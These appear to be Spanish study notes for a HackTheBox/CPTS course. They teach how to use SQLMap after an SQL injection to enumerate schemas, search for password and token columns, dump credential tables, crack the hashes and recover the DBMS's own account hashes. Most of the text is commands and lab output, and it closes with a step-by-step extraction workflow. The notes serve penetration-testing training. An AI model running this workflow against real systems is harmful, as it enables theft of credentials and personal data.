
## 1. Enumeración avanzada de bases de datos

Después de identificar una vulnerabilidad SQL Injection, SQLMap permite realizar una enumeración más avanzada para localizar información de interés.

En esta sección veremos cómo:

- Enumerar la estructura completa de las bases de datos.
    
- Buscar tablas y columnas mediante palabras clave.
    
- Recuperar hashes de contraseñas.
    
- Realizar ataques de diccionario contra los hashes.
    
- Enumerar credenciales de usuarios del DBMS.
    
- Automatizar la enumeración.
    

---

## 2. Enumerar el esquema completo de la BD

La opción `--schema` permite recuperar la estructura de las bases de datos accesibles.

```
sqlmap -u 'http://target.htb/?id=1' --schema
```

SQLMap mostrará:

- Bases de datos.
    
- Tablas.
    
- Columnas.
    
- Tipos de datos.
    

Ejemplo:

```
Database: master
Table: log

+--------+--------------+
| Column | Type         |
+--------+--------------+
| date   | datetime     |
| agent  | varchar(512) |
| id     | int(11)      |
+--------+--------------+

Database: owasp10
Table: accounts

+-------------+---------+
| Column      | Type    |
+-------------+---------+
| cid         | int(11) |
| mysignature | text    |
| password    | text    |
| username    | text    |
+-------------+---------+
```

Esto permite identificar rápidamente tablas interesantes sin tener que enumerarlas individualmente.

**Cuándo utilizarlo:** cuando queremos conocer la estructura completa de una base de datos o localizar tablas con información sensible.

---

## 3. Buscar tablas y columnas

Cuando existen muchas bases de datos, podemos utilizar `--search` para localizar nombres de tablas o columnas.

SQLMap utiliza búsquedas basadas en el operador SQL `LIKE`.

### Buscar tablas

Para buscar tablas que contengan la palabra `user`:

```
sqlmap -u 'http://target.htb/?id=1' \
--search \
-T user
```

Ejemplo:

```
Database: testdb
[1 table]

+-------+
| users |
+-------+

Database: master
[1 table]

+-------+
| users |
+-------+

Database: mysql
[1 table]

+------+
| user |
+------+
```

SQLMap busca tablas cuyo nombre coincida con la palabra indicada.

### Buscar columnas

Podemos buscar columnas que contengan una palabra específica.

Por ejemplo, para localizar columnas relacionadas con contraseñas:

```
sqlmap -u 'http://target.htb/?id=1' \
--search \
-C pass
```

Resultado:

```
Database: owasp10
Table: accounts

+----------+------+
| Column   | Type |
+----------+------+
| password | text |
+----------+------+

Database: master
Table: users

+----------+--------------+
| Column   | Type         |
+----------+--------------+
| password | varchar(512) |
+----------+--------------+
```

### Búsquedas útiles para HTB

**Buscar tablas de usuarios:**

```
sqlmap -r req.txt --search -T user
```

**Buscar tablas de administradores:**

```
sqlmap -r req.txt --search -T admin
```

**Buscar columnas de contraseñas:**

```
sqlmap -r req.txt --search -C pass
```

**Buscar columnas de tokens:**

```
sqlmap -r req.txt --search -C token
```

**Buscar columnas relacionadas con claves:**

```
sqlmap -r req.txt --search -C key
```

**Importante:** `--search` busca nombres de objetos de la base de datos, no valores almacenados dentro de las tablas.

# 4. Enumeración de contraseñas

Una vez identificada una tabla que contiene contraseñas, podemos recuperar su contenido mediante `--dump`.

Por ejemplo, si encontramos:

```
Database: master
Table: users
Column: password
```

Ejecutamos:

```
sqlmap -u 'http://target.htb/?id=1' \
-D master \
-T users \
--dump
```

SQLMap recuperará los registros de la tabla.

Si detecta valores que parecen hashes de contraseñas, puede mostrar:

```
[INFO] recognized possible password hashes in column 'password'

do you want to store hashes to a temporary file
for eventual further processing with other tools [y/N]
```

Podemos guardar los hashes para analizarlos posteriormente con otras herramientas.

Después, SQLMap preguntará:

```
do you want to crack them via a dictionary-based attack? [Y/n/q]
```

Si respondemos `Y`, intentará descifrar los hashes utilizando un ataque de diccionario.

---

## 5. Cracking automático de hashes

SQLMap dispone de funcionalidades para realizar ataques de diccionario contra hashes de contraseñas.

### Seleccionar el diccionario

Después de aceptar el cracking, SQLMap muestra:

```
what dictionary do you want to use?

[1] default dictionary file
[2] custom dictionary file
[3] file with list of dictionary files
```

Opciones:

- `1`: utilizar el diccionario incluido en SQLMap.
    
- `2`: utilizar un diccionario personalizado.
    
- `3`: utilizar un archivo que contenga rutas a diferentes diccionarios.
    

### Ejemplo con el diccionario predeterminado

Seleccionamos:

```
> 1
```

SQLMap puede identificar automáticamente el algoritmo:

```
[INFO] using hash method 'sha1_generic_passwd'
[INFO] using default dictionary
[INFO] starting dictionary-based cracking
```

Ejemplo de resultados:

```
[INFO] cracked password '05adrian'
for hash '70f361f8a1c9035a1d972a209ec5e8b726d1055e'

[INFO] cracked password '1201Hunt'
for hash 'df692aa944eb45737f0b3b3ef906f8372a3834e9'
```

Cuando consigue recuperar una contraseña, SQLMap puede mostrarla junto al hash original.

### Características del cracking

Según el módulo:

- SQLMap puede reconocer diferentes formatos de hashes.
    
- Soporta 31 algoritmos de hash en la versión descrita.
    
- Incluye un diccionario de aproximadamente 1,4 millones de entradas.
    
- Utiliza múltiples procesos para acelerar el cracking.
    
- Permite utilizar diccionarios personalizados.
    
- Puede probar sufijos habituales de contraseñas.
    

**Importante:** el cracking no garantiza recuperar las contraseñas. Depende del algoritmo, de la complejidad de la contraseña y del diccionario utilizado.

# 6. Enumerar contraseñas de usuarios del DBMS

Además de las credenciales almacenadas en tablas de aplicaciones, SQLMap puede intentar recuperar los hashes de los usuarios del propio gestor de bases de datos.

Para ello utilizamos `--passwords`.

```
sqlmap -u 'http://target.htb/?id=1' \
--passwords
```

SQLMap intentará recuperar las credenciales de los usuarios del DBMS.

Ejemplo:

```
[INFO] fetching database users password hashes

[INFO] retrieved: 'root'
[INFO] retrieved: 'debian-sys-maint'
```

Después puede preguntar si queremos realizar un ataque de diccionario.

Ejemplo de resultado:

```
database management system users password hashes:

[*] debian-sys-maint [1]:
    password hash: *6B2C58EABD91C1776DA223B088B601604F898847

[*] root [1]:
    password hash: *00E247AC5F9AF26AE0194B41E1E769DEE1429A29
    clear-text password: testpass
```

En este ejemplo, SQLMap consigue recuperar la contraseña del usuario `root` del DBMS.

**Diferencia importante:**

- `--dump -D master -T users`: recupera registros de una tabla de la aplicación.
    
- `--passwords`: intenta recuperar los hashes de las cuentas del propio DBMS.
    

La recuperación de hashes de usuarios del DBMS depende de los privilegios disponibles.

## 7. Automatizar la enumeración

SQLMap permite automatizar gran parte del proceso mediante las opciones `--all` y `--batch`.

### --all

Intenta recuperar toda la información de enumeración disponible.

### --batch

Utiliza las respuestas predeterminadas para las preguntas interactivas.

Podemos combinarlas:

```
sqlmap -u 'http://target.htb/?id=1' \
--all \
--batch
```

Esto permite ejecutar automáticamente las diferentes tareas de enumeración.

**Advertencia:** `--all` puede generar muchas consultas y tardar bastante tiempo, especialmente si existen muchas bases de datos o la SQL Injection es de tipo Blind.

Además, `--batch` acepta respuestas predeterminadas, por lo que conviene revisar qué operaciones estamos autorizados a realizar.

Para HTB suele ser más eficiente realizar una enumeración selectiva.

|Objetivo|Comando / Opción|
|---|---|

|Buscar tablas|`--search -T user`|
|Buscar columnas|`--search -C pass`|
|Extraer tabla|`-D master -T users --dump`|
|Recuperar hashes de usuarios del DBMS|`--passwords`|
|Enumeración automática|`--all`|

|Enumerar columnas|`-D database -T table --columns`|
|Extraer columnas específicas|`-D database -T table -C col1,col2 --dump`|

# 9. Metodología práctica para HTB / CPTS

## Paso 1. Confirmar SQL Injection

```
sqlmap -r req.txt -p id --batch
```

## Paso 2. Obtener información básica

```
sqlmap -r req.txt \
--current-user \
--current-db \
--is-dba \
--batch
```

## Paso 3. Enumerar el esquema

```
sqlmap -r req.txt --schema --batch
```

Esto permite identificar bases de datos, tablas y columnas.

## Paso 4. Buscar tablas interesantes

```
sqlmap -r req.txt --search -T user --batch
```

También podemos buscar otras tablas:

```
sqlmap -r req.txt --search -T admin --batch
```

## Paso 5. Buscar columnas de contraseñas

```
sqlmap -r req.txt --search -C pass --batch
```

Supongamos que encontramos:

```
Database: webapp
Table: users

Columns:
- id
- username
- password
```

## Paso 6. Recuperar credenciales

```
sqlmap -r req.txt \
-D webapp \
-T users \
-C username,password \
--dump
```

Si SQLMap detecta hashes, podemos guardarlos y utilizar su función de cracking por diccionario.

## Paso 7. Enumerar usuarios del DBMS

```
sqlmap -r req.txt --passwords
```

Esto permite comprobar si podemos recuperar hashes de las cuentas del gestor de bases de datos.

# 10. Puntos importantes para el examen

1. `**--schema**` permite visualizar la estructura de las bases de datos.
    
2. `**--search -T**` permite buscar tablas por nombre.
    
3. `**--search -C**` permite buscar columnas por nombre.
    
4. `**--dump**` recupera los registros de una tabla.
    
5. SQLMap puede detectar automáticamente hashes de contraseñas durante la extracción.
    
6. SQLMap permite realizar ataques de diccionario contra hashes recuperados.
    
7. `**--passwords**` intenta recuperar los hashes de los usuarios del DBMS.
    
8. `**--all --batch**` automatiza la enumeración, pero puede resultar lento y generar muchas peticiones.
    
9. Para bases de datos grandes, es preferible buscar tablas y columnas interesantes antes de extraer todo su contenido.
    

### Flujo principal que debes recordar

```
# 1. Detectar SQL Injection
sqlmap -r req.txt -p id --batch

# 2. Obtener información básica
sqlmap -r req.txt --current-user --current-db --is-dba --batch

# 3. Enumerar esquema
sqlmap -r req.txt --schema --batch

# 4. Buscar tablas de usuarios
sqlmap -r req.txt --search -T user --batch

# 5. Buscar columnas de contraseñas
sqlmap -r req.txt --search -C pass --batch

# 6. Extraer credenciales de una tabla
sqlmap -r req.txt -D webapp -T users -C username,password --dump

# 7. Recuperar hashes de usuarios del DBMS
sqlmap -r req.txt --passwords
```

**Idea principal:** cuando una base de datos contiene muchas tablas, podemos utilizar `--schema` y `--search` para localizar rápidamente información de interés. Después, `--dump` permite recuperar los registros seleccionados y SQLMap puede identificar y probar hashes mediante ataques de diccionario.
